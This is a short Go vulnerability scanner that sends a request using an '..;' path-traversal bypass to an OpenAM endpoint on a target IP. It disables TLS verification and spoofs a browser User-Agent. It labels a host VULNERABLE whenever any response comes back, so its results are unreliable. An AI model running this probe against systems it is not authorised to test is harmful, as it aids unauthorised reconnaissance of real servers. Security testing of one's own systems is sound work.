package main

import (
	"crypto/tls"
	"flag"
	"net/http"

	"github.com/gookit/color"
)

func main() {

	ipPtr := flag.String("i", "", "target ip")


	flag.Parse()

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", "http://"+*ipPtr+"/openam/oauth2/..;/ccversion/Version", nil)
	if err != nil {

	}

	req.Host = *ipPtr
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 99.99; rv:99.9) Gecko/20100101 Firefox/99.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Cookie", "JSESSIONID=")
	req.Header.Set("Connection", "close")


	resp, err := client.Do(req)
	if err != nil {
		color.Red.Println(*ipPtr, " [NOT VULNERABLE] ")
		return
	} else {
		color.Green.Print(*ipPtr, " [VULNERABLE] ")
	}

	defer resp.Body.Close()

}
